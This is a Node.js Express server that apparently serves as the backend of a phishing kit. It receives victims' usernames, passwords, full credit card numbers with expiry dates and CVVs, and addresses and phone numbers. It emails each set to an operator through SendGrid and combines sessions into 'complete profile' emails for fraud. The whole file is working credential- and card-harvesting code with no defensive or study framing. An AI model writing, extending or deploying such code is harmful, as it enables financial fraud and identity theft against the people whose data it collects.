const express = require('express');
const sgMail = require('@sendgrid/mail');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Initialize SendGrid
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

// Function to send email via SendGrid
async function sendEmail(subject, htmlContent, dataType) {
    try {
        const msg = {
            to: process.env.RECIPIENT_EMAIL,
            from: {
                email: process.env.SENDGRID_FROM_EMAIL,
                name: process.env.SENDGRID_FROM_NAME || 'Data Collection System'
            },
            subject: subject,
            html: htmlContent,
            categories: [dataType, 'data-collection']
        };

        const result = await sgMail.send(msg);
        console.log('SendGrid email sent:', result[0].statusCode);
        return true;
    } catch (error) {
        console.error('Error sending email via SendGrid:', error);
        if (error.response) {
            console.error('SendGrid error details:', error.response.body);
        }
        return false;
    }
}

// Function to format data as HTML email
function formatDataAsHTML(data, dataType) {
    const getHeaderColor = (type) => {
        switch(type) {
            case 'login': return '#dc3545';
            case 'credit_card': return '#fd7e14';
            case 'address_verification': return '#20c997';
            default: return '#6f42c1';
        }
    };

    const getIcon = (type) => {
        switch(type) {
            case 'login': return 'ð';
            case 'credit_card': return 'ð³';
            case 'address_verification': return 'ð ';
            default: return 'ð';
        }
    };

    return `
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { 
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                margin: 0; 
                padding: 0; 
                background: #f8f9fa; 
            }
            .container { 
                max-width: 700px; 
                margin: 0 auto; 
                background: white; 
                border-radius: 10px; 
                overflow: hidden; 
                box-shadow: 0 4px 6px rgba(0,0,0,0.1); 
            }
            .header { 
                background: ${getHeaderColor(dataType)}; 
                padding: 30px; 
                color: white; 
                text-align: center; 
            }
            .header h1 { 
                margin: 0; 
                font-size: 24px; 
            }
            .content { 
                padding: 30px; 
            }
            .data-section { 
                margin: 25px 0; 
                padding: 20px; 
                border: 2px solid #e9ecef; 
                border-radius: 8px; 
                background: #f8f9fa; 
            }
            .field { 
                margin: 15px 0; 
                display: flex; 
                align-items: center; 
            }
            .label { 
                font-weight: 600; 
                color: #495057; 
                width: 160px; 
                min-width: 160px; 
            }
            .value { 
                color: #212529; 
                flex: 1; 
            }
            .sensitive { 
                color: #dc3545; 
                font-weight: 700; 
                background: #fff5f5; 
                padding: 4px 8px; 
                border-radius: 4px; 
                border: 1px solid #feb2b2; 
            }
            .timestamp { 
                color: #6c757d; 
                font-size: 0.9em; 
                text-align: center; 
                margin: 20px 0; 
                padding: 10px; 
                background: #e9ecef; 
                border-radius: 5px; 
            }
            .footer { 
                text-align: center; 
                padding: 20px; 
                color: #6c757d; 
                font-size: 0.8em; 
                border-top: 1px solid #dee2e6; 
            }
            .alert-badge {
                display: inline-block;
                background: #dc3545;
                color: white;
                padding: 4px 12px;
                border-radius: 20px;
                font-size: 0.8em;
                margin-left: 10px;
                font-weight: 600;
            }
            .section-title {
                margin-top: 0;
                border-bottom: 2px solid #dee2e6;
                padding-bottom: 10px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>${getIcon(dataType)} New ${dataType.replace('_', ' ').toUpperCase()} Data</h1>
            </div>
            <div class="content">
                <div class="timestamp">
                    ð Received: ${new Date().toLocaleString()}
                </div>
                ${data}
            </div>
            <div class="footer">
                Data Collection System â¢ Automated Notification
            </div>
        </div>
    </body>
    </html>
    `;
}

// Function to create login data HTML
function createLoginHTML(credentials, userAgent, page, sessionData) {
    return `
    <div class="data-section">
        <h3 class="section-title" style="color: #dc3545;">Login Credentials <span class="alert-badge">SENSITIVE</span></h3>
        <div class="field">
            <span class="label">ð¤ Username:</span>
            <span class="value sensitive">${credentials.username || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">ð Password:</span>
            <span class="value sensitive">${credentials.password || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">ð¾ Remember Me:</span>
            <span class="value">${credentials.rememberMe ? 'â Yes' : 'â No'}</span>
        </div>
        <div class="field">
            <span class="label">ð Page:</span>
            <span class="value">${page || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">ð£ï¸ Language:</span>
            <span class="value">${sessionData?.language || 'Unknown'}</span>
        </div>
        <div class="field">
            <span class="label">ð User Agent:</span>
            <span class="value" style="font-size: 0.9em;">${userAgent || 'N/A'}</span>
        </div>
    </div>
    `;
}

// Function to create credit card data HTML
function createCreditCardHTML(cardData, userAgent, page, sessionData) {
    return `
    <div class="data-section">
        <h3 class="section-title" style="color: #fd7e14;">Credit Card Information <span class="alert-badge">HIGHLY SENSITIVE</span></h3>
        <div class="field">
            <span class="label">ð¤ First Name:</span>
            <span class="value">${cardData.firstName || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">ð¤ Last Name:</span>
            <span class="value">${cardData.lastName || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">ð³ Card Number:</span>
            <span class="value sensitive">${cardData.cardNumber || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">ð Expiry Date:</span>
            <span class="value sensitive">${cardData.expiryDate || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">ð CVV:</span>
            <span class="value sensitive">${cardData.cvv || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">â Terms Agreed:</span>
            <span class="value">${cardData.termsAgreed ? 'â Yes' : 'â No'}</span>
        </div>
        <div class="field">
            <span class="label">ð£ï¸ Language:</span>
            <span class="value">${sessionData?.language || 'Unknown'}</span>
        </div>
    </div>
    `;
}

// Function to create address data HTML
function createAddressHTML(addressData, userAgent, page, sessionData) {
    return `
    <div class="data-section">
        <h3 class="section-title" style="color: #20c997;">Address Verification <span class="alert-badge">PERSONAL DATA</span></h3>
        <div class="field">
            <span class="label">ð  Address Line 1:</span>
            <span class="value">${addressData.addressLine1 || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">ð  Address Line 2:</span>
            <span class="value">${addressData.addressLine2 || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">ðï¸ City:</span>
            <span class="value">${addressData.city || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">ðºï¸ State/Province:</span>
            <span class="value">${addressData.state || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">ð® ZIP/Postal Code:</span>
            <span class="value">${addressData.zipCode || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">ð Country:</span>
            <span class="value">${addressData.country || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">ð Phone Number:</span>
            <span class="value">${addressData.phone || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">ð Page:</span>
            <span class="value">${page || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">ð£ï¸ Language:</span>
            <span class="value">${sessionData?.language || 'Unknown'}</span>
        </div>
    </div>
    `;
}

// Function to create complete user profile HTML (when all data is collected)
function createCompleteProfileHTML(loginData, cardData, addressData, sessionData) {
    return `
    <div class="data-section">
        <h3 class="section-title" style="color: #6f42c1;">ð¯ COMPLETE USER PROFILE <span class="alert-badge" style="background: #6f42c1;">FULL DATA</span></h3>
        
        <h4 style="color: #dc3545; margin-top: 20px;">ð Login Information</h4>
        <div class="field">
            <span class="label">Username:</span>
            <span class="value sensitive">${loginData.username || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">Password:</span>
            <span class="value sensitive">${loginData.password || 'N/A'}</span>
        </div>
        
        <h4 style="color: #fd7e14; margin-top: 20px;">ð³ Payment Information</h4>
        <div class="field">
            <span class="label">Cardholder:</span>
            <span class="value">${cardData.firstName || 'N/A'} ${cardData.lastName || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">Card Number:</span>
            <span class="value sensitive">${cardData.cardNumber || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">Expiry/CVV:</span>
            <span class="value sensitive">${cardData.expiryDate || 'N/A'} / ${cardData.cvv || 'N/A'}</span>
        </div>
        
        <h4 style="color: #20c997; margin-top: 20px;">ð  Address Information</h4>
        <div class="field">
            <span class="label">Address:</span>
            <span class="value">${addressData.addressLine1 || 'N/A'} ${addressData.addressLine2 || ''}</span>
        </div>
        <div class="field">
            <span class="label">City/State/ZIP:</span>
            <span class="value">${addressData.city || 'N/A'}, ${addressData.state || 'N/A'} ${addressData.zipCode || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">Country:</span>
            <span class="value">${addressData.country || 'N/A'}</span>
        </div>
        <div class="field">
            <span class="label">Phone:</span>
            <span class="value">${addressData.phone || 'N/A'}</span>
        </div>
        
        <div class="field">
            <span class="label">Session Language:</span>
            <span class="value">${sessionData?.language || 'Unknown'}</span>
        </div>
    </div>
    `;
}

// Store user sessions to combine data
const userSessions = new Map();

app.post('/api/submit', async (req, res) => {
    const { type, data, timestamp, userAgent, page, sessionData } = req.body;
    
    console.log('Received data type:', type);
    
    let subject = '';
    let htmlContent = '';
    let dataType = type || 'login';

    try {
        // Generate session ID based on user agent and timestamp
        const sessionId = `${userAgent}-${sessionData?.language || 'unknown'}`;
        
        // Initialize session if not exists
        if (!userSessions.has(sessionId)) {
            userSessions.set(sessionId, {
                loginData: null,
                cardData: null,
                addressData: null,
                sessionData: sessionData,
                firstSeen: new Date()
            });
        }
        
        const userSession = userSessions.get(sessionId);
        
        // Store data based on type
        switch(dataType) {
            case 'login':
                userSession.loginData = data;
                subject = `ð LOGIN Credentials - ${data.username || 'Unknown User'}`;
                htmlContent = formatDataAsHTML(
                    createLoginHTML(data, userAgent, page, sessionData),
                    dataType
                );
                break;
                
            case 'credit_card':
                userSession.cardData = data;
                subject = `ð³ CREDIT CARD Submission - ${data.firstName || 'Unknown'} ${data.lastName || ''}`;
                htmlContent = formatDataAsHTML(
                    createCreditCardHTML(data, userAgent, page, sessionData),
                    dataType
                );
                break;
                
            case 'address_verification':
                userSession.addressData = data;
                subject = `ð  ADDRESS Verification - ${data.city || 'Unknown Location'}, ${data.state || ''}`;
                htmlContent = formatDataAsHTML(
                    createAddressHTML(data, userAgent, page, sessionData),
                    dataType
                );
                
                // Check if we have complete data for a profile summary
                if (userSession.loginData && userSession.cardData) {
                    setTimeout(() => {
                        const completeSubject = `ð¯ COMPLETE PROFILE - ${userSession.loginData.username || 'User'}`;
                        const completeHTML = formatDataAsHTML(
                            createCompleteProfileHTML(
                                userSession.loginData,
                                userSession.cardData,
                                userSession.addressData,
                                userSession.sessionData
                            ),
                            'complete_profile'
                        );
                        sendEmail(completeSubject, completeHTML, 'complete_profile');
                    }, 2000);
                }
                break;
                
            default:
                subject = `ð Unknown Data Submission`;
                htmlContent = formatDataAsHTML(
                    `<div class="data-section"><h3>Unknown Data Type</h3><pre>${JSON.stringify(data, null, 2)}</pre></div>`,
                    'unknown'
                );
        }
        
        // Clean up old sessions (older than 1 hour)
        const now = new Date();
        for (const [id, session] of userSessions.entries()) {
            if (now - session.firstSeen > 60 * 60 * 1000) { // 1 hour
                userSessions.delete(id);
            }
        }
        
        // Send email
        const emailSent = await sendEmail(subject, htmlContent, dataType);
        
        if (emailSent) {
            console.log(`SendGrid email sent successfully for ${dataType} data`);
            res.json({ 
                status: 'success', 
                message: 'Data received and email sent via SendGrid',
                dataType: dataType,
                sessionId: sessionId
            });
        } else {
            res.status(500).json({ 
                status: 'error', 
                message: 'Failed to send email via SendGrid' 
            });
        }
        
    } catch (error) {
        console.error('Error processing request:', error);
        res.status(500).json({ 
            status: 'error', 
            message: 'Internal server error',
            error: error.message 
        });
    }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'Server is running', 
        email: 'SendGrid integration enabled',
        fromEmail: process.env.SENDGRID_FROM_EMAIL,
        activeSessions: userSessions.size
    });
});

// Get session statistics
app.get('/api/sessions', (req, res) => {
    const stats = {
        totalSessions: userSessions.size,
        sessionsWithLogin: Array.from(userSessions.values()).filter(s => s.loginData).length,
        sessionsWithCard: Array.from(userSessions.values()).filter(s => s.cardData).length,
        sessionsWithAddress: Array.from(userSessions.values()).filter(s => s.addressData).length,
        completeProfiles: Array.from(userSessions.values()).filter(s => s.loginData && s.cardData && s.addressData).length
    };
    
    res.json(stats);
});

app.listen(PORT, () => {
    console.log(`ð§ Backend server with SendGrid integration running on port ${PORT}`);
    console.log(`ð§ Emails will be sent from: ${process.env.SENDGRID_FROM_EMAIL}`);
    console.log(`ð¨ Recipient: ${process.env.RECIPIENT_EMAIL}`);
    console.log(`ð Address verification system enabled`);
});
